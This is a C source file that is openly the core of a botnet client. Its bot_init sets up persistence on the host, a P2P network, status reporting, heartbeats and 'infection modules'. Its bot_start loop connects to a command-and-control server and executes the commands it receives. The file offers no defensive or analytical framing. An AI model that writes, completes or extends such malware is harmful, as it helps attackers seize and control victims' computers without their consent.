#include "../../include/botnet.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/select.h>
#include <errno.h>

void bot_init() {
    printf("[*] Initializing bot...\n");
    setup_signal_handler();
    persistence_establish(); // Establish persistence on the system
    p2p_init(); // Initialize the P2P network
    reporting_init(); // Start the status reporting thread
    start_heartbeat();
    infection_init(); // Start the infection modules
    printf("[+] Bot initialized.\n");
}

void bot_start() {
    printf("[*] Starting bot...\n");

    if (!c2_connect()) {
        printf("[-] Failed to connect to C2 server. Retrying in background...\n");
    }

    // Main loop using select() for efficient I/O
    while (1) {
        fd_set read_fds;
        struct timeval tv;
        int c2_sock = get_c2_sock();

        // If connection is down, don't try to select on an invalid socket
        if (c2_sock < 0) {
            sleep(5); // Wait before the heartbeat thread tries to reconnect
            continue;
        }

        FD_ZERO(&read_fds);
        FD_SET(c2_sock, &read_fds);

        tv.tv_sec = 30;
        tv.tv_usec = 0;

        int activity = select(c2_sock + 1, &read_fds, NULL, NULL, &tv);

        if ((activity < 0) && (errno != EINTR)) {
            perror("select");
            continue;
        }

        if (FD_ISSET(c2_sock, &read_fds)) {
            char command[1024];
            int len = c2_recv(command, sizeof(command) - 1);
            if (len > 0) {
                command[len] = '\0';
                controller_handle_command(command, 0); // Command is from C2, not P2P
            } else if (len == 0) {
                printf("[-] C2 server closed connection. Reconnecting...\n");
                c2_disconnect();
            } else {
                // Error on recv (EAGAIN or EWOULDBLOCK is expected)
                if (errno != EAGAIN && errno != EWOULDBLOCK) {
                    perror("recv");
                    c2_disconnect();
                }
            }
        }
    }
}

void bot_stop() {
    printf("[*] Stopping bot...\n");
    c2_disconnect();
    printf("[+] Bot stopped.\n");
}
